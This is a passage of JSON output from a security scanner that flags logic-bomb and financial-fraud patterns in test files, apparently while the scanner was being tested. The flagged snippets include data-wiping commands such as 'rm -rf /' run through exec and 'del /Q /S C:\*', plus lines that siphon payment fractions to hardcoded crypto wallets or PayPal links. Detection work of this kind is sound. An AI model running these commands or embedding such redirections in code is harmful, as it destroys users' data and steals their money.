      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.738720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "paypal_link = \"paypal.me/developer123\"",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.738720",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "36f26924-95fa-4e17-ac90-de996ed2b129",
      "last_modified": "",
      "line_number": 114,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.738720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Secret transfer to crypto wallet.\"\"\"",
      "column": 31,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.738720",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "8c184ad3-58f5-4ba9-9c55-0a1d2836b84c",
      "last_modified": "",
      "line_number": 119,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.738720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "bitcoin_address = \"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\"",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.739720",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "6cd8d23c-c892-44f2-91ad-ceabf9ce91a8",
      "last_modified": "",
      "line_number": 120,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.739720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "transfer_money(slush_fund_total, my_personal_account)",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.739720",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "8665e2eb-d2e3-45db-85bb-ac0eeacf5cff",
      "last_modified": "",
      "line_number": 162,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.739720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Send amount to developer's crypto wallet.\"\"\"",
      "column": 39,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.740718",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "ced69123-4577-4e3b-b34f-4179c82c9cc5",
      "last_modified": "",
      "line_number": 201,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.740718"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "self.crypto_transfer(amount, selected_wallet)",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.740718",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "57e6f86f-44db-47d4-b179-85880f19c256",
      "last_modified": "",
      "line_number": 215,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.740718"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "def crypto_transfer(self, amount, wallet_address):",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.741720",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "88535a1c-f36b-4322-af24-89620bf3af3c",
      "last_modified": "",
      "line_number": 217,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.741720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Transfer to cryptocurrency wallet.\"\"\"",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.741720",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "52e1d17f-ecb4-41a2-a705-f3cede343cf1",
      "last_modified": "",
      "line_number": 218,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.741720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "shutil.rmtree('/important_folder')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.760719",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "d6596839-efc1-47fc-8e48-94f9dd1d822b",
      "last_modified": "",
      "line_number": 8,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:23:02.760719"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.system('del /Q /S C:\\\\*')",
      "column": 8,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.760719",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "72035d16-f378-4554-b064-38102c1e4a44",
      "last_modified": "",
      "line_number": 9,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:23:02.760719"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "exec(\"__import__('os').system('rm -rf /')\")",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.761719",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "5edb7d7d-d14a-4124-98c5-9e09e1225d30",
      "last_modified": "",
      "line_number": 12,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Code execution - System compromise risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:23:02.761719"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove('/critical.txt')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.763722",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "e03ffe42-3d7b-4f45-af41-d170afe88244",
      "last_modified": "",
      "line_number": 16,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:23:02.763722"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# Redirect payment to developer account",
      "column": 11,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.885718",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "ed575627-0275-4114-9c80-f903be42a705",
      "last_modified": "",
      "line_number": 10,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.885718"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "crypto_wallet = \"0x742d35Cc6634C0532925a3b8D40F4174e3A59339\"",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.885718",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "96a26ee5-d684-4d98-ab1b-7d810d6c19b9",
      "last_modified": "",
      "line_number": 22,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.885718"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "transfer_crypto(fee * 0.01, crypto_wallet)",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.885718",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "46e62d35-6809-4d47-86a0-5a9d7a2adeb5",
      "last_modified": "",
      "line_number": 23,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.885718"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "paypal_link = \"paypal.me/developer123\"",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.886717",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "f6f29e7f-d219-48c4-a733-956bdbbb2918",
      "last_modified": "",
      "line_number": 27,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.886717"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "redirect_payment(amount * 0.001, paypal_link)",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.886717",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "a535270e-accf-4329-929e-ef4afd033155",
      "last_modified": "",
      "line_number": 28,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.886717"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "def transfer_crypto(amount, wallet):",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.887720",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "91a58867-0bb3-4ac2-a44b-c26ab6f5ffeb",
      "last_modified": "",
      "line_number": 41,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.887720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Transfer to crypto wallet.\"\"\"",
      "column": 20,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.887720",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "538f8b99-e810-4b88-af7c-fa3a7e5d4dfd",
      "last_modified": "",
      "line_number": 42,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.887720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "def redirect_payment(amount, paypal):",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.887720",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "a7238cd7-7f8a-4651-b3da-24e31c44861d",
      "last_modified": "",
      "line_number": 45,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.887720"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "exec(\"transfer_money(100, 'hidden_account')\")",
      "column": 7,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.888722",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "d3153e84-d7da-4b72-841f-72929e213993",
      "last_modified": "",
      "line_number": 54,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Code execution - System compromise risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "7da0d619-e4d9-4be2-946e-f1562ad727f0",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:23:02.888722"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# PATTERN 8: Hardcoded Bitcoin address",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:23:02.888722",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "a7efba02-2456-42b7-bae5-ad646a8f1f34",
      "last_modified": "",
      "line_number": 56,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
